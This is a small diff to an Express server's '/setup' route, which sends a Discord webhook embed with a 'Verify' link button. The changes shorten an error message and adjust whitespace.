@@ -20,10 +20,11 @@ app.post('/collect', (req, res) => {
 
 app.get('/setup', async (req, res) => {
     const webhookUrl = process.env.DISCORD_WEBHOOK_HELLO?.trim();
+
     if (!webhookUrl) {
-        console.error('Error: DISCORD_WEBHOOK_HELLO is not set.');
-        return res.status(500).send('Webhook URL is missing in variables.');
+        return res.status(500).send('Webhook URL is missing.');
     }
+
     try {
         await axios.post(webhookUrl, {
             embeds: [{
@@ -32,10 +33,10 @@ app.get('/setup', async (req, res) => {
                 color: 0x5865f2
             }],
             components: [{
-                type: 1,
+                type: 1, 
                 components: [{
                     type: 2,
-                    style: 5,
+                    style: 5, 
                     label: 'Verify',
                     url: 'https://botinfotest-production.up.railway.app'
                 }]
